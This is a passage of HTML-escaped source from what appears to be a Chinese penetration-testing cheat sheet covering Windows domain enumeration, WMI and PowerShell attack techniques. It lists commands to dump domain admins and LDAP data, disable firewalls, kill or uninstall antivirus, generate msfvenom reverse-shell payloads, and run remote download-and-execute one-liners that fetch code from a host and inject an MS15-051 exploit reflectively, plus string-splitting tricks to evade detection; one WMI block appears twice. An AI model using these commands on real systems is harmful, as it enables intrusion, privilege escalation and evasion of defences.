icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami /user 查看当前用户SID&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net config Workstation 查看当前计算机信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net time /domain 判断主域&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;错误5：存在域，当前不是域用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;显示时间：存在域，当前是域内用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;找不到域：不存在&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net view /domain 列出域列表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net group \&quot;Domain Controllers\&quot; /domain查看主域控&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nltest /DCLIST:zone.com 查看域控&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net group \&quot;domain admins\&quot; /domain 查看域管理员&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net group \&quot;enterprise admins\&quot; /domain 查看企业管理员列表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net localgroup administrators /domain 查看管理组用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net group \&quot;domain computers\&quot; /domain 查看域成员计算机&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net accounts /domain 查看密码策略&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net user /domain查看域内用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net view /domain:dc 查询域内计算机&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netsh firewall set opmode disable/enable 关闭windows防火墙(win2003)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netsh advfirewall set allprofiles state off/on(大于win2003)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;arp -a查看arp表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net start 查看服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;route print查看路由表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;query user查看登录机器的用户的连接状态&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;tasklist /v 查看域管理员进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dsquery server查询域控制器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dsquery computer 查询域内机器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dsquery user 查询域用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dsquery ou 域内组织单位&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;导出域DNS记录，文件保存在C:\\Windows\\System32\\dns\\&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dnscmd /zoneexport zone.com 1.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;导出LDAP数据库&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;LDIFDE -f c:\\windows\\temp\\dump.ldf -n -m&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;wmi\&quot;&gt;Wmi&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#wmi\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic service list brief 列出本机服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process list brief 列出进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where name=\&quot;chrome.exe\&quot; get executablepath进程路径&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process get caption,commandline /value1.txt查询所有进程参数&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where caption=\&quot;svchost.exe\&quot; get caption,commandline /value 查询某个进程命令行参数&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;创建进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create calc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create \&quot;C:\\shell.exe\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create \&quot;shutdown.exe -r -f -t 20\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;结束进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where name=\&quot;shell.exe\&quot; call terminate&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where processid=\&quot;2345\&quot; delete&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process 2345 call terminate&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic startup list brief 列出自启动程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic netuse list brief 列出共享驱动盘&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic ntdomain list brief 查询域控制器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic useraccount list brief 列出本机管理员及SID&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic qfe list brief 列出补丁列表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic share get name,path 查看共享&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic startup list brief查看启动项&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product get name,version 查看安装的软件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where \&quot;name like &#39;%360%&#39;\&quot; get name 查看程序名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where name=\&quot;360tray\&quot; call uninstall 卸载程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where \&quot;name like &#39;%360%&#39;\&quot; get name 查找进程全名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where name=\&quot;360tray.exe\&quot; call terminate 停止程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic desktop get screensaversecure,screensavertimeout 查看屏保&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;wmi-1\&quot;&gt;Wmi&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#wmi-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic service list brief 列出本机服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process list brief 列出进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where name=\&quot;chrome.exe\&quot; get executablepath进程路径&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process get caption,commandline /value1.txt查询所有进程参数&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where caption=\&quot;svchost.exe\&quot; get caption,commandline /value 查询某个进程命令行参数&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;创建进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create calc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create \&quot;C:\\shell.exe\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create \&quot;shutdown.exe -r -f -t 20\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;结束进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where name=\&quot;shell.exe\&quot; call terminate&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where processid=\&quot;2345\&quot; delete&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process 2345 call terminate&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic startup list brief 列出自启动程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic netuse list brief 列出共享驱动盘&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic ntdomain list brief 查询域控制器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic useraccount list brief 列出本机管理员及SID&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic qfe list brief 列出补丁列表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic share get name,path 查看共享&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic startup list brief查看启动项&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product get name,version 查看安装的软件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where \&quot;name like &#39;%360%&#39;\&quot; get name 查看程序名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where name=\&quot;360tray\&quot; call uninstall 卸载程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where \&quot;name like &#39;%360%&#39;\&quot; get name 查找进程全名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where name=\&quot;360tray.exe\&quot; call terminate 停止程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic desktop get screensaversecure,screensavertimeout 查看屏保&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;powershell基础操作\&quot;&gt;Powershell基础操作&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#powershell基础操作\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查看版本$PSVersionTable&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;远程执行&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -nop -w hidden -ep bypass \&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;);Invoke-xxx\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/100.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;加载exe&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom生成exe木马&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe  /var/www/html/1.exe  &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用powersploit的Invoke-ReflectivePEInjection.ps1脚本&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell.exe -w hidden -exec bypass -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR\&quot; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;EXE2PS1&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将exe转换为base64&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Import-Module .\\Convert-BinaryToString.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Convert-BinaryToString -FilePath .\\ms15051.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/101.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-ReflectivePEInjection.ps1文件头部添加&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Function MS15051{&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&amp;#x3C;#&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.SYNOPSIS    &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.EXAMPLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;C:\\PS MS15051 -Command \&quot;whoami\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt; [CmdletBinding()]&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    param(&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;        [Parameter(Mandatory = $False)]&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;        [string]&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;        $Command&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  )&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;$InputString = \&quot;文件的base64编码\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;$PEBytes = [System.Convert]::FromBase64String($InputString)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;文件尾部添加&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;write-host (\&quot;[+] Executing Command: \&quot;+$Command)  -foregroundcolor \&quot;Green\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;write-host (\&quot;[+] Done !\&quot;)  -foregroundcolor \&quot;Green\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/102.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;远程下载执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -nop -w hidden -ep bypass \&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1&#39;); MS15051 –Command \\\&quot;whoami\\\&quot;\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/103.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;绕过策略&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell.exe -nop -exec bypass -c \&quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-xxx.ps1&#39;);invoke-xxx\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -File ./a.ps1&amp;#x26;Import-Module xxx&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;Base64&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;use exploit/multi/script/web_delivery|target=2(PSH)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&amp;#x26;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat payload.txt | iconv --to-code UTF-16LE |base64&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -ep bypass -enc base64code&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;写入bat绕过&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -File ./a.ps1 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将该命令保存为c.bat&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;拼接拆分字符串&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell.exe  &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;$c1=&#39;powershell -c IEX&#39;; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;$c2=&#39;(New-Object Net.WebClient).Downlo&#39;; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;$c3=&#39;adString(\&quot;http://192.168.197.192/a.ps1\&quot;)&#39;; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;echo ($c1,$c2,$c3) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;\&quot; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell $c2=&#39;IEX (New-Object Net.WebClient).Downlo&#39;;$c3=&#39;adString(&#39;&#39;http://x.x.x.x/a&#39;&#39;)&#39;; $Text=$c2+$c3; IEX(-join $Text)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;Replace替换函数&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -noexit \&quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://192.168.0.108/1.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)\&quot; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;HTTP字符拼接绕过&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; 